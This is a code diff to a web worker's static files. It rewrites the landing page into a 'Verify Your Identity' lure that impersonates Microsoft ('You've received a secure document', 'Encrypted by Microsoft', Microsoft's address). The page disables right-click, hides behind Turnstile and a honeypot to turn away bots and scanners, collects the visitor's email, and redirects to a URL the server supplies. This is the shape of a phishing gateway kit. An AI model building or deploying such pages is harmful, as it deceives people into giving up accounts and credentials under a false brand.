@@ -577,57 +577,386 @@ async function serveStaticFile(filename) {
     'index.html': `<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Access Portal</title>
-    <link rel="stylesheet" href="/styles.css">
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+	<meta charset="UTF-8" />
+	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
+	<title>Verify Your Identity</title>
+	<style type="text/css">body {
+            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+            color: #333;
+            background-image: url('https://i.postimg.cc/2yCKWRgT/454a309b-0d26-4b60-86e9-acaf4e25cf74.jpg'); /* Add your background image here */
+            background-size: cover;
+            background-position: center;
+        }
+
+        .header {
+            width: 100%;
+            background-color: #0078d4;
+            color: white;
+            text-align: left;
+            padding: 10px 20px;
+            box-sizing: border-box;
+            font-size: 18px;
+            position: absolute;
+            top: 0;
+        }
+
+        .header span {
+            margin-left: 20px;
+        }
+
+        .container {
+            background-color: white;
+            border: 1px solid #ccc;
+            border-radius: 20px;
+            padding: 33px;
+            width: 80%;
+            max-width: 300px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-top: 0px;
+        }
+
+        .container img {
+            width: 155px; /* Increased width */
+            margin-bottom: 5px;
+            margin-top: 20px;
+        }
+
+        .container h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .container p {
+            margin-bottom: 10px;
+            color: #666;
+        }
+
+        .container p2 {
+            margin-bottom: 10px;
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        .container input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            font-size: 16px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .container button:hover {
+            background-color: #005a9e;
+        }
+
+        .container button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .container .footer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+
+        .turnstile-container {
+            margin: 20px 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .message.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .message.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .honeypot-field {
+            position: absolute;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+
+            .container h2 {
+                font-size: 20px;
+            }
+
+            .container .space {
+                margin-bottom: 20px;
+            }
+
+            .container input[type="email"] {
+                font-size: 14px;
+            }
+
+            .container button {
+                font-size: 14px;
+            }
+        }
+	</style>
+	<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </head>
 <body>
-    <div class="container" id="mainContent">
-        <div class="card">
-            <div class="header">
-                <h1 id="pageTitle">Secure Access Portal</h1>
-                <p id="pageSubtitle">Enter your email to continue</p>
-            </div>
-            
-            <form id="emailForm" class="email-form">
-                <div class="input-group">
-                    <input 
-                        type="email" 
-                        id="emailInput" 
-                        placeholder="Enter your email address"
-                        required
-                        autocomplete="email"
-                    >
-                    
-                    <!-- Honeypot field (hidden from users) -->
-                    <input 
-                        type="text" 
-                        id="honeypotField" 
-                        name="honeypot" 
-                        style="position: absolute; left: -9999px; opacity: 0;"
-                        tabindex="-1"
-                        autocomplete="off"
-                    >
-                </div>
-                
-                <!-- Turnstile widget -->
-                <div class="turnstile-container">
-                    <div class="cf-turnstile"></div>
-                </div>
-                
-                <button type="submit" id="submitBtn" class="submit-btn" disabled>
-                    <span class="btn-text">Continue</span>
-                    <span class="btn-loading" style="display: none;">Verifying...</span>
-                </button>
-            </form>
-            
-            <div id="message" class="message" style="display: none;" role="alert"></div>
-        </div>
-    </div>
+<div class="container">
+    <img alt="" src="https://i.postimg.cc/3N0shf46/download.png" />
+    <h2>Verify Your Identity</h2>
+
+    <p><strong>You've received a secure document:</strong></p>
+    <p2>To access this secure document, we'll need to verify the intended recipient's email. Please enter the email address to which this document was shared.</p2>
     
-    <script src="/script.js"></script>
+    <form id="emailForm">
+        <input id="email-input" placeholder="Enter email" required="" style="margin-top: 10px;" type="email" />
+        
+        <div class="turnstile-container">
+            <div id="turnstile-widget" data-sitekey="0x4AAAAAABnnez0Dy-TkLp3r"></div>
+        </div>
+        
+        <button id="continue-button" type="submit" disabled>Next</button>
+        
+        <!-- Honeypot field -->
+        <input type="text" id="honeypotField" class="honeypot-field" name="honeypot" autocomplete="off" />
+    </form>
+
+    <div id="message" class="message"></div>
+
+    <div class="footer" style="font-family:'Segoe UI'; ">
+        <p>Encrypted by Microsoft</p>
+        <a href="https://privacy.microsoft.com/en-gb/privacystatement" target="_blank">Privacy Statement</a><br />
+        Microsoft Corporation, One Microsoft Way, Redmond, WA 98052 USA
+    </div>
+</div>
+
+<script>
+    // Disable right-click
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // Main application logic
+    class SecureRedirectApp {
+        constructor() {
+            this.form = document.getElementById('emailForm');
+            this.emailInput = document.getElementById('email-input');
+            this.submitBtn = document.getElementById('continue-button');
+            this.messageDiv = document.getElementById('message');
+            this.turnstileWidget = null;
+            
+            this.init();
+        }
+        
+        init() {
+            this.setupEventListeners();
+            this.setupTurnstile();
+        }
+        
+        setupEventListeners() {
+            this.form.addEventListener('submit', (e) => this.handleSubmit(e));
+            this.emailInput.addEventListener('input', () => this.clearError());
+        }
+        
+        setupTurnstile() {
+            // Wait for Turnstile to load
+            const checkTurnstile = () => {
+                if (window.turnstile) {
+                    try {
+                        this.turnstileWidget = window.turnstile.render('#turnstile-widget', {
+                            sitekey: '0x4AAAAAABnnez0Dy-TkLp3r',
+                            callback: (token) => {
+                                this.onTurnstileSuccess(token);
+                            },
+                            'expired-callback': () => {
+                                this.onTurnstileExpired();
+                            },
+                            'error-callback': () => {
+                                console.error('Turnstile error occurred');
+                                this.showError('Verification failed. Please try again.');
+                            }
+                        });
+                        console.log('Turnstile widget rendered successfully');
+                    } catch (error) {
+                        console.error('Error rendering Turnstile widget:', error);
+                        this.showError('Failed to load verification. Please refresh the page.');
+                    }
+                } else {
+                    setTimeout(checkTurnstile, 100);
+                }
+            };
+            
+            checkTurnstile();
+        }
+        
+        onTurnstileSuccess(token) {
+            console.log('Turnstile validation successful');
+            // Enable the submit button
+            this.submitBtn.disabled = false;
+            this.submitBtn.style.opacity = '1';
+        }
+        
+        onTurnstileExpired() {
+            console.log('Turnstile validation expired');
+            // Disable the submit button
+            this.submitBtn.disabled = true;
+            this.submitBtn.style.opacity = '0.7';
+            this.showError('Verification expired. Please try again.');
+        }
+        
+        async handleSubmit(e) {
+            e.preventDefault();
+            
+            const email = this.emailInput.value.trim();
+            const honeypotField = document.getElementById('honeypotField').value;
+            
+            // Basic email check - let server handle detailed validation
+            if (!email || email.trim() === '') {
+                this.showError('Please enter an email address.');
+                return;
+            }
+            
+            // Check if Turnstile is completed
+            if (!window.turnstile || !window.turnstile.getResponse()) {
+                this.showError('Please complete the verification.');
+                return;
+            }
+            
+            this.setLoading(true);
+            
+            try {
+                const response = await fetch('/api/validate', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        turnstileToken: window.turnstile.getResponse(),
+                        honeypotField: honeypotField
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    this.showMessage('Redirecting...', 'success');
+                    setTimeout(() => {
+                        window.location.href = data.redirectUrl;
+                    }, 1000);
+                } else {
+                    this.showError(data.message || 'Access denied.');
+                    // Reset Turnstile on error
+                    if (window.turnstile) {
+                        window.turnstile.reset();
+                    }
+                    this.submitBtn.disabled = true;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                this.showError('An error occurred. Please try again.');
+                // Reset Turnstile on error
+                if (window.turnstile) {
+                    window.turnstile.reset();
+                }
+                this.submitBtn.disabled = true;
+            } finally {
+                this.setLoading(false);
+            }
+        }
+        
+        showError(message) {
+            this.emailInput.classList.add('error');
+            this.showMessage(message, 'error');
+            
+            // Remove error class after animation
+            setTimeout(() => {
+                this.emailInput.classList.remove('error');
+            }, 500);
+        }
+        
+        clearError() {
+            this.emailInput.classList.remove('error');
+            this.hideMessage();
+        }
+        
+        showMessage(message, type = 'success') {
+            this.messageDiv.textContent = message;
+            this.messageDiv.className = \`message \${type}\`;
+            this.messageDiv.style.display = 'block';
+            
+            // Auto-hide success messages
+            if (type === 'success') {
+                setTimeout(() => {
+                    this.hideMessage();
+                }, 3000);
+            }
+        }
+        
+        hideMessage() {
+            this.messageDiv.style.display = 'none';
+        }
+        
+        setLoading(loading) {
+            if (loading) {
+                this.submitBtn.textContent = 'Verifying...';
+                this.submitBtn.disabled = true;
+            } else {
+                this.submitBtn.textContent = 'Next';
+                // Keep disabled if Turnstile is not completed
+                if (window.turnstile && window.turnstile.getResponse()) {
+                    this.submitBtn.disabled = false;
+                }
+            }
+        }
+    }
+
+    // Initialize the app when DOM is loaded
+    document.addEventListener('DOMContentLoaded', () => {
+        new SecureRedirectApp();
+    });
+</script>
 </body>
 </html>`,
     'styles.css': `/* Reset and base styles */
@@ -828,7 +1157,7 @@ class SecureRedirectApp {
     constructor() {
         this.form = document.getElementById('emailForm');
         this.emailInput = document.getElementById('emailInput');
-        this.submitBtn = document.getElementById('submitBtn');
+        this.submitBtn = document.getElementById('continue-button');
         this.messageDiv = document.getElementById('message');
         this.turnstileWidget = null;
         
